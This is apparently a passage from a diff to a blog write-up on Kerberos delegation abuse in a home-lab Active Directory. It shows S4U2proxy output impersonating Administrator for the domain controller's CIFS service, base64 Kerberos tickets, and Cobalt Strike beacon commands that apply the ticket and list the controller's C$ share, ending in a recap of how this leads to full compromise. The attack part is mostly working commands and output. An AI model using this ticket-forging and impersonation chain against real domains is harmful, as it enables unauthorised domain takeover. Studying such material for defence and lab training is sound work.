KIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAAChAAClERgPMjAyNjA0MDExNzU3NDJaphEYDzIwMjYwNDAyMDM1MjEyWqcRGA8yMDI2MDQwODE3NTIxMlqoCxsJTE9MLkxPQ0FMqRUwE6ADAgEBoQwwChsIRkFLRS1QQyQ=
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01'
+[*] Building S4U2proxy request for service: 'cifs/dc01'
+[*] Using domain controller: dc01 (10.0.0.2)
+[*] Sending S4U2proxy request to domain controller 10.0.0.2:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc01':
+
+      doIFvDCCBbigAwIBBaEDAgEWooIE3DCCBNhhggTUMIIE0KADAgEFoQsbCUxPTC5MT0NBTKIXMBWgAwIBAqEOMAwbBGNpZnMbBGRjMDGjggShMIIEnaADAgESoQMCAQmiggSPBIIEi5CeaZRI3vmQ1ebioK4qflh110z1W9joFk/oHNq4oo/hUJmGWdZ5cv1U7yCfgMpWyioCWrFX3tvR3DGriGVgrFnDqpc96Y7WjiqkzZxKf+Asp7E/m/LUzgwf3Sw+XQzhm5eR02p4nCsa1+UYUHennEcPta//xjDSpU+AiNP62unRVTJFlMBCrccl/e3iiFcpRk3wQlrhZd7qBkVGW9vmOWG6/BXvV1JyR9pUTAsf/2K41wuMGqPjvIOKyyMNbxuXuASxw5sUI76B3jzrCvvpXRFxzySr5AD9dAabGpktd6RzLz+RNM/WWHngCJon/Qh3uIIvfpXXQJgb0mg0DthP5Yiwile2BTzZPGFO09vT9Nx+9snH+Df8jZVHqoJJhiyMA2nS6CpGALMlq1unhtVGzvOg95JQsp9G7Xf775YmbI6alw/n8MUbDs+ZVi2GM5QV9Idl14VuL6yoJA2BzqbBlhKq/eHePvwFUjjimdh4ltlvup+87jgDTs6EGvMm2MvXDQhMZ9Exu6o2uJ5A17I9Ppws8OIwWKqzhVB5sO/tukNd+JAekjt2zBosVGu18dnJ38W+AumTpR1zZI66bmk05GV1YrKBmxkBrW6X405D2919WR4oMkMDlIw3pUCbnzfNtsicAENWTXpZwbfrTo13oBspix9sokNShnFg1OVVviCIlcOETft4RbNB0F2kDgTPqhNnMNQtQG/dl+AhUHd+bGh++EPS1D6VVd5BHXl9DYOwBfwtwI8gEx7eE1Nu7AyHFTWnNU58Ae4UYS+QGB2mTX6TPvR2ayMl6uD2ikJ2T4dP6iCr2VFrewwZghqxmhOGe2wbQxyy2nrxCFtuBr0sgNQMkZ6dfByZfTRUqiWraRU8Aa7xGQHktDBRt/p+aQP0aH1CF5dR9VUvwO3UKFiIQwfSLgPxcZg144eX70FKDv+U7XRRyjarOGExbDjN6GhFQU/5eAgwqX0icAeoTFZVb3uvaZ98Uml3mp1oA0dQMb39kMxwxH9kZD4KMyeB2mafBpjJVAE0UuXFVmlBaa5JzOF/J1PTbRe696gufGeWTcs5STJKdlR5uU8rYCq45Z9mtk3OzC1Gv0CcLBh8Dj2+f+8c13lk2aRUx2bkoYVWGBLH4VS3bALef/iTAkW8ZhsVAcQJNyTNKFtZ80u4DSuJtNyo6vzCaIdVEMy1b62+oEY31LnO88ic0JnKSrFAO8YPu6+FW2Srl0noquAbNRcoCZSoGuR/QiBLNbh8CQX3l81HxwbngW5kJh3Pp7J6swmONolbzI7nP9v0OmKJmc5QKi1XRkg2wOOniLP+t1k5e5dzBMoi/7CoHD7+75K8JTDbPonVtIxdZVGIRFKlsB/zAfpEv8etiV9baaRs1ANSokd77yGXvJf7hivmRnrzBM5wn8mBOhA/nTUBQOaIJyQdf8gpfGZaR1P1mtdiQMlL8Vs63UH0o/Qcsj7a6JXZclS4LbuAh6/hk/y/RqTdClmUEGSkV3AdNGxeBvTphzM8deWjHqUC9uYipbRw3w5O6t2JackZBLGkdd7eJ+J+o4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEwga6gGzAZoAMCARGhEgQQXLj4AtOSf58FbLJGLcS59qELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjYwNDAxMTc1NzQyWqYRGA8yMDI2MDQwMjAzNTIxMlqnERgPMjAyNjA0MDgxNzUyMTJaqAsbCUxPTC5MT0NBTKkXMBWgAwIBAqEOMAwbBGNpZnMbBGRjMDE=
+```
+After injecting the S4U2Proxy into a logon session we can list `c$` content on `dc01`
+```
+beacon> ls \\dc01\c$
+[*] Tasked beacon to list files in \\dc01\c$
+[+] host called home, sent: 27 bytes
+[-] could not open \\dc01\c$\*: 5 - ERROR_ACCESS_DENIED
+
+beacon> make_token LOL\administrator anypassword
+[*] Tasked beacon to create a token for LOL\administrator
+[+] host called home, sent: 47 bytes
+[+] Impersonated LOL\administrator (netonly)
+
+beacon> kerberos_ticket_use /home/kali/Desktop/machines/homelab/rbcd.kirbi
+[*] Tasked beacon to apply ticket in /home/kali/Desktop/machines/homelab/rbcd.kirbi
+[+] host called home, sent: 3534 bytes
+beacon> ls \\dc01\c$
+[*] Tasked beacon to list files in \\dc01\c$
+[+] host called home, sent: 27 bytes
+[*] Listing: \\dc01\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     07/10/2025 02:22:32   $Recycle.Bin
+          dir     06/07/2025 08:21:25   Documents and Settings
+          dir     09/15/2018 10:19:00   PerfLogs
+          dir     04/01/2026 14:50:32   Program Files
+          dir     06/07/2025 21:29:35   Program Files (x86)
+          dir     03/31/2026 16:20:22   ProgramData
+          dir     03/10/2026 07:37:14   Pwneddddd
+          dir     06/07/2025 08:21:27   Recovery
+          dir     03/28/2026 13:58:45   ShareSupport
+          dir     03/31/2026 22:51:16   System Volume Information
+          dir     03/26/2026 16:38:47   testshare
+          dir     09/04/2025 07:18:29   Users
+          dir     03/08/2026 08:06:05   Windows
+ 321kb    fil     02/12/2026 16:43:57   http.exe
+ 1mb      fil     03/09/2026 23:19:28   LAPS.x64.msi
+ 1gb      fil     03/31/2026 20:05:38   pagefile.sys
+``` 
+
+--- 
+## So.. what we have done today?
+In this blog, we took a deep dive into Kerberos delegation by analyzing the network traffic behind each step, from forced authentication to ticket issuance and abuse.
+We then showed how those identities can be leveraged through S4U techniques and subtle ticket manipulation to gain elevated access.
+All of this highlights how simply Kerberos’ intended behavior can lead to full compromise when the right pieces are in place.
+
+Happy hacking!
 ---
 
 ## TO-DO
@@ -1077,5 +1348,5 @@ Tomorrow..
 
 [^blog]: [Windows authentication attacks part 2 – kerberos](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/)
 [^protected]: [Protected Users security group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
-[^ntlm]: [Windows authentication attacks – part 1](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/)
+[^ntlm]: [Windows authentication attacks – part 1](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)
 [^PA-FOR-USER]: [PA-FOR-USER Checksum function](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aceb70de-40f0-4409-87fa-df00ca145f5a)
